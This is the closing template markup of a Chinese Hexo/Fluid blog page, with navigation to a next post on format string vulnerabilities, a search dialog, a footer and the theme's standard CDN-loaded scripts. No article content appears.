                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/02/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" title="格式化字符串漏洞">
                        <span class="hidden-mobile">格式化字符串漏洞</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
